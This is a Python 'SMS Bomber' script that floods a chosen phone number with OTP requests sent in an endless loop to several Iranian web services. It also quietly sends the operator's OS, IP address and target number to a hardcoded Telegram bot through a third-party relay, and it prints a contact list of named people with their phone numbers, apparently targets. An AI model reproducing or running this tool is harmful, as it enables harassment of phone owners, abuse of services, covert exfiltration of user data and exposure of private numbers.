import os
os.system ("cls")


try:
    from colorama import Fore,init
    init()
except:
    print (" [-] Error  (Import) - Install Colorama")
    exit()

try:
    import requests
except:
    print (" [-] Error  (Import) - Install Requests")
    exit()

try:
    import datetime
except:
    print (" [-] Error  (Import) - Install Datetime")
    exit()

try:
    import time
except:
    print (" [-] Error  (Import) - Install Time")
    exit()

try:
    import platform
except:
    print (" [-] Error  (Import) - Install Platform")
    exit()

try:
    import socket
except:
    print (" [-] Error  (Import) - Install Socket")
    exit ()


def banner() :
    print (Fore.YELLOW, """
 ╔════════════════════════════════════════════════════════════════════════════════════╗
 ╚═╗ ███████╗███╗   ███╗███████╗ ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗  ║
   ║ ██╔════╝████╗ ████║██╔════╝ ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗ ║
   ║ ███████╗██╔████╔██║███████╗ ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝ ║
   ║ ╚════██║██║╚██╔╝██║╚════██║ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗ ║
   ║ ███████║██║ ╚═╝ ██║███████║ ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║ ║
   ║ ╚══════╝╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ║
   ╚══════════════════════════════════════════════════════════════════════════════════╝
       [ DEVELOPER: ARTORKI ]  ==  [ BOUGHT ]  ==  [ VERSION: 4 ]  ==  [23-3-20]         
 ══════════════════════════════════════════════════════════════════════════════════════
""", Fore.LIGHTCYAN_EX)

banner()


if "2023-03-20" in str(datetime.datetime.now()) :
    print (Fore.LIGHTRED_EX, "[~] The expiration date has expired !")
    exit()


try:
    c = requests.get ("http://google.com/")
except:
    print (Fore.LIGHTRED_EX, "[-] Error (Connection)")
    exit()


password = input (" [SMSB_V4|--> ")

if password == "shakerin4" :
    pass
elif password == "e" or password == "E" :
    exit()
else:
    print (Fore.LIGHTRED_EX, "\n\n [-] Error (Password)")
    exit()


while True :

    print (Fore.LIGHTYELLOW_EX, """\n [~] Phone number (tx 9*********) :
 [C] Contacts
 [E] Exit
""", Fore.LIGHTCYAN_EX)

    try:
        phone_number = input (" [SMSB_V4|--> ")
    except:
        print (Fore.LIGHTRED_EX, "\n\n [-] Error (Values)")
        exit()

    if phone_number == "C" or phone_number == "c" :
        print (Fore.YELLOW, """
 [10] Ahmadizadeh:  9109051230
 [10] Ghavipangeh:  9179637298
 [10] Gholamzadeh:  9172175641
 [10] Bahmani:  9027767945
 [10] Dehghan:  9027960115
 [10] Firouzi:  9306762757
 [10] Ghasemi:  9170606413
 [10] Haghjoo:  9334448379
 [10] Asnafi:  9025748143
 [10] Moradi:  9178463473
 [10] Nozari:  9944809121
 [11] Baghodrat:  9177935805
 [11] Fazelian:  9305652449
 [11] Moghimi:  9052788703
 [11] Farhan:  9170533504
 [11] Safari:  9057261941
 [11] Shafei:   9126352459
    """)

        input()

    elif phone_number == "E" or phone_number == "e" :
        exit()

    elif phone_number == "" or phone_number[0] == "0" or phone_number[0] == "+" :
        print (Fore.LIGHTRED_EX, "\n [-] Error  (Phone number)")
        exit()
    
    elif len(phone_number) < 10 :
        print (Fore.LIGHTRED_EX, "\n [-] Error  (Phone number)")
        exit()

    else:
        break

    
if phone_number[0] == "t" :
    phone_number = phone_number[:-11]
    
    run_time = phone_number[1]
    run_time = int(run_time) * 60
    time.sleep (run_time)


time = datetime.datetime.now()
os = platform.uname()[0] + platform.uname()[2]
host = socket.gethostname()
ip = socket.gethostbyname(host)

msg = """
SMS BOMBER  V4 ...
==============================
[~] OS:  {}
[~] IP:  {}
[~] Num:  {}
==============================
{}
""".format(os,ip,phone_number,time)

payload = {
"UrlBox" : "https://api.telegram.org/bot5933232535:AAEmiH6TfgxItHlR9MmrSmTOOh-ONPANX8E/sendMessage?text={}&chat_id=5446661281".format(msg),
"AgentList":"Mozilla Firefox",
"VersionList":"HTTP/1.1",
"MethodList":"Post"
}

try:
    t = requests.post ("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",payload)
except:
    print (Fore.LIGHTRED_EX, "\n [~] Error  (Requests)")


def req() :
    r01 = requests.post ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data= {"cellphone": "+98"+phone_number})
    r02 = requests.post ("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=SUPERAPP_SPLITPAGE&optionalClient=SUPERAPP_SPLITPAGE&deviceType=SUPERAPP_SPLITPAGE&appVersion=5.6.6&clientVersion=4bec0266&optionalVersion=5.6.6&UDID=3245bbc5-3a18-49a3-8b61-23cacb11c41d", data= {"cellphone": "+98"+phone_number})
    r03 = requests.post ("https://auth.basalam.com/otp-request", {"mobile": "0"+phone_number})
    r04 = requests.post ("https://bit24.cash/api/auth/check-mobile", data= {"mobile": "0"+phone_number})
    r05 = requests.post ("https://api.bitpin.ir/v1/usr/sub_phone/", data= {"phone": "0"+phone_number})
    r06 = requests.post ("https://drdr.ir/api/registerEnrollment/verifyMobile", data= {"phoneNumber": phone_number, "userType": "PATIENT"})
    r07 = requests.get ("https://filmnet.ir/api-v2/access-token/users/{}/otp" .format ("0"+phone_number))
    r08 = requests.get ("https://api.torob.com/v4/user/phone/send-pin/?phone_number={}" .format ("0" + phone_number))
    r09 = requests.get ("https://api.torob.com/v4/user/phone/send-pin/?phone_number={}" .format ("0" + phone_number))
    


num = 0

print (Fore.LIGHTGREEN_EX)

while True:
    try:
        req()
        num += 2
        print (" [+] " + str(num) + " Sent to :  " + phone_number)

    except:
        print (Fore.LIGHTRED_EX, """
 [~] Error  (Requests)
 [P] Play again
 [E] Exit""")

        print (Fore.LIGHTCYAN_EX)
        q = input (" [SMSB_V4|--> ")

        if q == "P" or q == "p" :
            print (Fore.LIGHTGREEN_EX)
        else:
            exit()
